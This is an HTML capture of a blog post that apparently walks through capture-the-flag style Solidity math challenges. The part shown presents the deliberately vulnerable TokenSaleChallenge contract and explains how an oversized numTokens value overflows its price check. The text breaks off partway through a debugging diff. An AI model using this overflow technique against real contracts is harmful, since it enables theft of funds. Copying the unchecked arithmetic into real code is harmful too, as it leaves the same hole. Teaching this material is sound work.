.group-hover\:hidden{display:none}.dark\:bg-gray-600:is(.dark *){--tw-bg-opacity:1;background-color:rgb(75 85 99/var(--tw-bg-opacity,1))}.dark\:text-white\/60:is(.dark *){color:hsla(0,0%,100%,.6)}@media (max-width:767px){.sm\:grid{display:grid}.sm\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.sm\:pt-5{padding-top:1.25rem}.sm\:pt-\[20px\]{padding-top:20px}}@media (max-width:1023px){.md\:block{display:block}.md\:hidden{display:none}.md\:px-\[15px\]{padding-left:15px;padding-right:15px}}@media (min-width:1024px){.lg\:flex{display:flex}.lg\:hidden{display:none}.lg\:grid-cols-3{grid-template-columns:repeat(3,minmax(0,1fr))}.lg\:items-center{align-items:center}.lg\:px-\[15px\]{padding-left:15px;padding-right:15px}.lg\:pb-\[100px\]{padding-bottom:100px}.lg\:pl-\[230px\]{padding-left:230px}.lg\:pl-\[30px\]{padding-left:30px}.lg\:pr-\[30px\]{padding-right:30px}.lg\:pt-4{padding-top:1rem}.lg\:pt-\[50px\]{padding-top:50px}.lg\:text-\[40px\]{font-size:40px}.lg\:text-\[70px\]{font-size:70px}}@media (min-width:1200px){.xl\:px-\[30px\]{padding-left:30px;padding-right:30px}.xl\:pl-\[300px\]{padding-left:300px}.xl\:pl-\[50px\]{padding-left:50px}.xl\:pr-\[50px\]{padding-right:50px}.xl\:pt-8{padding-top:2rem}.xl\:pt-\[70px\]{padding-top:70px}}@media (min-width:768px) and (max-width:1023px){.only-md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.only-md\:pl-5{padding-left:1.25rem}.only-md\:pr-\[20px\]{padding-right:20px}.only-md\:text-\[35px\]{font-size:35px}.only-md\:text-\[55px\]{font-size:55px}}</style>
<style>.offcanvas__header--menu__open{display:none;line-height:1}.offcanvas__header--menu__open--btn>*{pointer-events:none}@media only screen and (max-width:991px){.offcanvas__header--menu__open{display:block}}.offcanvas__header--menu__open--svg{width:32px}.offcanvas__header{box-shadow:0 0 10px rgba(0,0,0,.15);height:100vh;left:0;max-width:300px;opacity:0;position:fixed;top:0;transform:translateX(-100%);transition:.3s;visibility:hidden;width:100%;z-index:9999}@media only screen and (min-width:480px){.offcanvas__header{max-width:320px}}.offcanvas__header.open{opacity:1;transform:translateX(0);visibility:visible}.offcanvas__header.open~.offcanvas-overlay{opacity:.75;visibility:visible}.offcanvas-overlay{background-color:#000;height:100%;left:0;opacity:0;position:fixed;top:0;transition:.3s;visibility:hidden;width:100%;z-index:9998}.offcanvas__inner{height:100%;position:relative}.offcanvas__logo{align-items:center;display:flex;justify-content:space-between;padding:20px 15px}.offcanvas__close--btn{align-self:center;background-color:transparent;border:none;height:20px;padding:0;position:relative;text-indent:-9999px;width:20px}.offcanvas__close--btn:after,.offcanvas__close--btn:before{background-color:#000;content:"";height:2px;left:0;margin-top:-1px;position:absolute;top:50%;transform:rotate(45deg);width:100%}.offcanvas__close--btn:after{transform:rotate(-45deg)}.offcanvas__menu{height:100%;overflow-y:auto}.offcanvas__menu_ul{list-style:none;margin:0;max-height:300px;overflow:auto;padding:0}.offcanvas__menu_li{border-bottom:1px solid #e4e4e4;position:relative}.offcanvas__menu_li:first-child{border-top:1px solid #e4e4e4}.offcanvas__menu_item{display:block;line-height:1;padding:15px 20px;text-transform:uppercase}.offcanvas__sub_menu{display:none;list-style:none;margin:0;padding:0}.offcanvas__sub_menu_li{border-top:1px solid #e4e4e4;position:relative}.offcanvas__sub_menu_item{display:block;line-height:1}.offcanvas__sub_menu_item~.offcanvas__sub_menu .offcanvas__sub_menu_item{padding-left:40px}.offcanvas__sub_menu_toggle{background-color:transparent;border:none;border-radius:0;font-size:20px;height:46px;padding:0;position:absolute;top:0;width:40px;z-index:9}.offcanvas__sub_menu_toggle:after,.offcanvas__sub_menu_toggle:before{background-color:#000;content:"";height:2px;left:50%;position:absolute;top:50%;transform:translateX(-50%) translateY(-50%);transition:.3s;width:12px}.offcanvas__sub_menu_toggle:not(.active):after{transform:translateX(-50%) translateY(-50%) rotate(90deg)}.offcanvas__account--items{padding:28px 17px 20px}.offcanvas__account--items__icon{background:#ee2761;border-radius:50%;color:#fff;height:30px;line-height:28px;text-align:center;width:30px}</style>
<style>pre code .line{display:block}</style>
<script src="/js/imagesloaded.pkgd.min.js" defer></script>
<script src="/js/isotope.pkgd.min.js" defer></script>
<script src="/js/script.js" defer></script>
<link rel="icon" type="image/x-icon" href="/favicon.ico">
<meta property="og:image" content="https://alexshepherd.me/images/posts/2022.03.28T213033_learning-smart-contract-security-3.png">
<meta property="og:url" content="https://alexshepherd.me/posts/learning-smart-contract-security-3">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Learning Smart Contract Security - Part 3">
<meta name="twitter:description" content="Learning how maths cam be troublesome when working with Solidity">
<meta name="twitter:image" content="https://alexshepherd.me/images/posts/2022.03.28T213033_learning-smart-contract-security-3.png">
<meta property="og:title" content="Learning Smart Contract Security - Part 3">
<meta name="description" content="Learning how maths cam be troublesome when working with Solidity">
<meta property="og:description" content="Learning how maths cam be troublesome when working with Solidity">
<script id="unhead:payload" type="application/json">{"title":"Dev Blog","titleTemplate":"%s | alexshepherd.me"}</script></head><body  class="bg-[#F5F5F5]"><div id="__nuxt"><div><!--[--><div class="md:hidden lg:flex lg:items-center bg-accent1 fixed left-0 top-0 h-full"><div><div class="logo flex justify-center items-center"><a href="/"><img class="max-w-[210px] px-5" src="/images/logo.svg" alt=""></a></div><div class="pt-[40px]"><div class="max-w-[405px] order-first"><div><div class="text-center z-10"><div class="pb-5"><img class="rounded-full mx-auto border border-zinc-50 p-1 max-w-[180px]" src="/images/profile.jpg" alt=""></div><span class="text-zinc-50 font-pontano"> Backend / DevOps / Architect</span></div><div class="text-center pt-3 pb-6 z-10"><span class="text-zinc-50 font-pontano">Brit by birth,<br>located worldwide</span></div><div class="border-t border-[#bbb] py-6 px-7 z-10"><div class="flex items-center justify-around"><a class="w-7 h-7 flex items-center" href="https://linkedin.com/in/n00bsys0p" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="#fafafa"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg></a><a class="w-7 h-7 flex items-center justify-center" href="https://github.com/n00bsys0p" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" fill="#fafafa"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3 .3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5 .3-6.2 2.3zm44.2-1.7c-2.9 .7-4.9 2.6-4.6 4.9 .3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3 .7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3 .3 2.9 2.3 3.9 1.6 1 3.6 .7 4.3-.7 .7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3 .7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3 .7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></div></div></div></div></div><p class="text-slate-500 mt-14 text-xs text-center px-5"> All content © Alex Shepherd 2008-2024<br>unless otherwise noted</p></div></div><div class="offcanvas__header lg:hidden bg-accent1"><div class="offcanvas__inner"><div class="offcanvas__logo justify-end"><button class="offcanvas__close--btn text-white float-right" data-offcanvas>close</button></div><nav class="offcanvas__menu"><div><div class="logo flex justify-center items-center"><a href="/"><img class="max-w-[210px] px-5" src="/images/logo.svg" alt=""></a></div><div class="pt-[40px]"><div class="max-w-[405px] order-first"><div><div class="text-center z-10"><div class="pb-5"><img class="rounded-full mx-auto border border-zinc-50 p-1 max-w-[180px]" src="/images/profile.jpg" alt=""></div><span class="text-zinc-50 font-pontano">Full stack / DevOps / Architect</span></div><div class="text-center pt-2 pb-6 z-10"><span class="text-zinc-50 font-pontano">Brit by birth, located worldwide</span></div><div class="border-t border-[#bbb] py-6 px-7 z-10"><div class="flex items-center justify-around"><a class="w-7 h-7 flex items-center" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" fill="#fafafa"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg></a><a class="w-7 h-7 flex items-center justify-center" href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" fill="#fafafa"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3 .3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5 .3-6.2 2.3zm44.2-1.7c-2.9 .7-4.9 2.6-4.6 4.9 .3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3 .7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3 .3 2.9 2.3 3.9 1.6 1 3.6 .7 4.3-.7 .7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3 .7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3 .7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></div></div></div></div></div><p class="text-slate-500 mt-14 text-xs text-center px-5"> All content © Alex Shepherd 2008-2024<br>unless otherwise noted</p></div></nav></div></div><div class="h-full bg-[#F5F5F5] bg-cover bg-no-repeat bg-center"><header class="hidden w-full md:block xl:pt-8 pt-7 bg-accent1"><div class="xxl:px-[100px] xl:px-[30px] lg:px-[15px] md:px-[15px]"><div class="flex justify-center"><div class="logo hidden md:block"><a href="/"><img class="max-w-[150px]" src="/images/logo.svg" alt=""></a></div></div></div><div class="lg:hidden flex justify-center py-4"><button class="offcanvas__header--menu__open--btn text-zinc-50" data-offcanvas><svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button></div></header><main><div class="xxl:pl-[440px] xl:pl-[300px] lg:pl-[230px] xxl:pr-[100px] xl:pr-[50px] lg:pr-[30px] only-md:pr-[20px] md:px-[15px]"><div class="xxl:pl-[100px] xl:pl-[50px] lg:pl-[30px] only-md:pl-5"><section class="blog-list px-3 py-5 p-md-5"><article class="blog-post px-3 py-5 p-md-5"><header class="blog-post-header"><h2 class="title mb-2 text-heading">Learning Smart Contract Security - Part 3</h2><div class="mb-3"><span class="text-zinc-600">Published <span data-livestamp="2022-03-28T21:30:33"></span></span><br><small class="text-zinc-400">19 min read</small></div></header><div class="blog-post-body"><figure class="blog-banner"><img class="img-fluid" src="/images/posts/2022.03.28T213033_learning-smart-contract-security-3.png" alt="image"><figcaption class="mt-2 text-center image-caption"> Image Credit: <a href="https://ethereum.org/assets" target="_blank">ethereum.org</a></figcaption></figure><!--[--><div><p><!--[-->Continuing on <a href="/posts/learning-smart-contract-security-2" class=""><!--[-->from the last article<!--]--></a>, where we explored why &quot;private&quot; state variables were less than private, and how sources of randomness could be less than random in a few situations when developing Smart Contracts in Solidity, today we&#39;re going to learn how maths can be a stumbling-block in the process of ensuring our Smart Contracts&#39; integrity.<!--]--></p><p><!--[-->This article is a fair epic, so here are links to each section for your convenience:<!--]--></p><ol><!--[--><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#tokensalechallenge" class="router-link-active router-link-exact-active"><!--[-->Token Sale<!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#tokenwhalechallenge" class="router-link-active router-link-exact-active"><!--[-->Token Whale<!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#retirementfundchallenge" class="router-link-active router-link-exact-active"><!--[-->Retirement Fund<!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#mappingchallenge" class="router-link-active router-link-exact-active"><!--[-->Mapping<!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#donationchallenge" class="router-link-active router-link-exact-active"><!--[-->Donation<!--]--></a><!--]--></li><li><!--[--><a aria-current="page" href="/posts/learning-smart-contract-security-3#fiftyyearschallenge" class="router-link-active router-link-exact-active"><!--[-->Fifty Years<!--]--></a><!--]--></li><!--]--></ol><p><!--[-->And if you just want to go and check out the finished code, it&#39;s <a href="https://github.com/n00bsys0p/vscode-devcontainer-solidity-development-environment/tree/1.3.0" rel="nofollow"><!--[-->all available on Github<!--]--></a>.<!--]--></p><p><!--[-->Let&#39;s jump in...<!--]--></p><h3 id="tokensalechallenge"><a href="#tokensalechallenge"><!--[-->TokenSaleChallenge<!--]--></a></h3><p><!--[-->Let&#39;s start out with <a href="/posts/learning-smart-contract-security-2" class=""><!--[-->the first Math challenge - Token Sale<!--]--></a>.<!--]--></p><div language="solidity" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate">contracts/math/TokenSale.sol</div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-solidity shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#F97583">pragma</span><span style="--shiki-default:#85E89D"> solidity</span><span style="--shiki-default:#79B8FF"> ^0.4.21</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="2"><span emptylineplaceholder="true">
</span></span><span class="line" line="3"><span style="--shiki-default:#F97583">contract</span><span style="--shiki-default:#B392F0"> TokenSaleChallenge</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="4"><span style="--shiki-default:#F97583">    mapping</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#F97583"> =&gt;</span><span style="--shiki-default:#79B8FF"> uint256</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> balanceOf;
</span></span><span class="line" line="5"><span style="--shiki-default:#79B8FF">    uint256</span><span style="--shiki-default:#F97583"> constant</span><span style="--shiki-default:#E1E4E8"> PRICE_PER_TOKEN </span><span style="--shiki-default:#F97583">=</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="6"><span emptylineplaceholder="true">
</span></span><span class="line" line="7"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> TokenSaleChallenge</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">address</span><span style="--shiki-default:#E1E4E8"> _player) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="8"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">);
</span></span><span class="line" line="9"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="10"><span emptylineplaceholder="true">
</span></span><span class="line" line="11"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> isComplete</span><span style="--shiki-default:#E1E4E8">() </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> view</span><span style="--shiki-default:#F97583"> returns</span><span style="--shiki-default:#E1E4E8"> (</span><span style="--shiki-default:#79B8FF">bool</span><span style="--shiki-default:#E1E4E8">) {
</span></span><span class="line" line="12"><span style="--shiki-default:#F97583">        return</span><span style="--shiki-default:#79B8FF"> address</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">this</span><span style="--shiki-default:#E1E4E8">).balance </span><span style="--shiki-default:#F97583">&lt;</span><span style="--shiki-default:#79B8FF"> 1</span><span style="--shiki-default:#79B8FF"> ether</span><span style="--shiki-default:#E1E4E8">;
</span></span><span class="line" line="13"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="14"><span emptylineplaceholder="true">
</span></span><span class="line" line="15"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> buy</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> numTokens</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#F97583"> payable</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="16"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">msg</span><span style="--shiki-default:#E1E4E8">.value </span><span style="--shiki-default:#F97583">==</span><span style="--shiki-default:#E1E4E8"> numTokens </span><span style="--shiki-default:#F97583">*</span><span style="--shiki-default:#E1E4E8"> PRICE_PER_TOKEN);
</span></span><span class="line" line="17"><span emptylineplaceholder="true">
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">        balanceOf[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">+=</span><span style="--shiki-default:#E1E4E8"> numTokens;
</span></span><span class="line" line="19"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="20"><span emptylineplaceholder="true">
</span></span><span class="line" line="21"><span style="--shiki-default:#F97583">    function</span><span style="--shiki-default:#B392F0"> sell</span><span style="--shiki-default:#E1E4E8">(</span><span style="--shiki-default:#79B8FF">uint256</span><span style="--shiki-default:#FFAB70"> numTokens</span><span style="--shiki-default:#E1E4E8">) </span><span style="--shiki-default:#F97583">public</span><span style="--shiki-default:#E1E4E8"> {
</span></span><span class="line" line="22"><span style="--shiki-default:#F97583">        require</span><span style="--shiki-default:#E1E4E8">(balanceOf[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">&gt;=</span><span style="--shiki-default:#E1E4E8"> numTokens);
</span></span><span class="line" line="23"><span emptylineplaceholder="true">
</span></span><span class="line" line="24"><span style="--shiki-default:#E1E4E8">        balanceOf[</span><span style="--shiki-default:#79B8FF">msg.sender</span><span style="--shiki-default:#E1E4E8">] </span><span style="--shiki-default:#F97583">-=</span><span style="--shiki-default:#E1E4E8"> numTokens;
</span></span><span class="line" line="25"><span style="--shiki-default:#79B8FF">        msg.sender</span><span style="--shiki-default:#E1E4E8">.</span><span style="--shiki-default:#B392F0">transfer</span><span style="--shiki-default:#E1E4E8">(numTokens </span><span style="--shiki-default:#F97583">*</span><span style="--shiki-default:#E1E4E8"> PRICE_PER_TOKEN);
</span></span><span class="line" line="26"><span style="--shiki-default:#E1E4E8">    }
</span></span><span class="line" line="27"><span style="--shiki-default:#E1E4E8">}
</span></span></code><!--]--></pre></div></div><p><!--[-->At first glance, it looks pretty self-explanatory - buy tokens for 1 ETH each, and sell them for the same value. Looking in a litte more depth, the thing that we first notice about this Smart Contract is the lack of bounds control on the <code class=""><!--[-->uint256 numTokens<!--]--></code> parameter on the <code class=""><!--[-->buy<!--]--></code> method. Because <code class=""><!--[-->1 ether<!--]--></code> is just syntactical sugar for 10<sup>18</sup>, and a uint256 is limited to a maximum value of 2<sup>256</sup>-1, that leaves us with a potential unchecked overlap of 10<sup>18</sup>. Solidity <a href="https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html#silent-changes-of-the-semantics" rel="nofollow"><!--[-->only introduced integer over and underflow protection in v0.8.0<!--]--></a>. In prior versions, and integer over or underflow wraps back through the whole range. This should means that if we pass <code class=""><!--[-->numTokens<!--]--></code> as (2<sup>256</sup>/10<sup>18</sup>)+1, we overflow the uint256 back past 0. Also notice that in this challenge, in order to pass we don&#39;t have to drain the account, we just have to reduce the balance below 1 ether. Let&#39;s try something out by adding some debug logging to the Smart Contract via <a href="https://hardhat.org/tutorial/debugging-with-hardhat-network.html#solidity-console-log" rel="nofollow"><!--[-->Hardhat&#39;s console.log function<!--]--></a>.<!--]--></p><div language="diff" meta style=""><div class="border shadow-lg bg-code_background my-2 rounded-md py-3 px-5 group overflow-x-auto"><div class="flex sm:grid sm:grid-cols-3 mb-3 justify-between items-center"><div class="flex gap-2"><div class="size-3 rounded-full bg-[#FE5F57] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#FEBC2E] hidden group-hover:block"></div><div class="size-3 rounded-full bg-[#28C840] hidden group-hover:block"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div><div class="size-3 rounded-full dark:bg-gray-600 bg-neutral-400 group-hover:hidden"></div></div><div class="font-mono text-xs text-center dark:text-white/60 max-sm:truncate"></div><div class="flex justify-end text-zinc-50"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy-icon cursor-pointer opacity-50"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></div></div><pre class="language-diff shiki shiki-themes github-dark my-0 font-[500] bg-transparent leading-normal font-mono"><!--[--><code><span class="line" line="1"><span style="--shiki-default:#79B8FF">diff --git a/contracts/math/TokenSaleChallenge.sol b/contracts/math/TokenSaleChallenge.sol
</span></span><span class="line" line="2"><span style="--shiki-default:#E1E4E8">index 3f8546f..3a3bcac 100644
</span></span><span class="line" line="3"><span style="--shiki-default:#FDAEB7">--- a/contracts/math/TokenSaleChallenge.sol
</span></span><span class="line" line="4"><span style="--shiki-default:#85E89D">+++ b/contracts/math/TokenSaleChallenge.sol
</span></span><span class="line" line="5"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -1,5 +1,7 @@
</span></span><span class="line" line="6"><span style="--shiki-default:#E1E4E8"> pragma solidity ^0.4.21;
</span></span><span class="line" line="7"><span emptylineplaceholder="true">
</span></span><span class="line" line="8"><span style="--shiki-default:#85E89D">+import &quot;hardhat/console.sol&quot;;
</span></span><span class="line" line="9"><span style="--shiki-default:#85E89D">+
</span></span><span class="line" line="10"><span style="--shiki-default:#E1E4E8"> contract TokenSaleChallenge {
</span></span><span class="line" line="11"><span style="--shiki-default:#E1E4E8">     mapping(address =&gt; uint256) public balanceOf;
</span></span><span class="line" line="12"><span style="--shiki-default:#E1E4E8">     uint256 constant PRICE_PER_TOKEN = 1 ether;
</span></span><span class="line" line="13"><span style="--shiki-default:#B392F0;--shiki-default-font-weight:bold">@@ -13,6 +15,7 @@</span><span style="--shiki-default:#E1E4E8"> contract TokenSaleChallenge {
</span></span><span class="line" line="14"><span style="--shiki-default:#E1E4E8">     }
</span></span><span class="line" line="15"><span emptylineplaceholder="true">
</span></span><span class="line" line="16"><span style="--shiki-default:#E1E4E8">     function buy(uint256 numTokens) public payable {
</span></span><span class="line" line="17"><span style="--shiki-default:#85E89D">+        console.log(&quot;Overflow: %s&quot;, numTokens * PRICE_PER_TOKEN);
</span></span><span class="line" line="18"><span style="--shiki-default:#E1E4E8">         require(msg.value == numTokens * PRICE_PER_TOKEN);
</span></span><span class="line" line="19"><span emptylineplaceholder="true">
</span></span><span class="line" line="20"><span style="--shiki-default:#E1E4E8">         balanceOf[msg.sender] += numTokens;
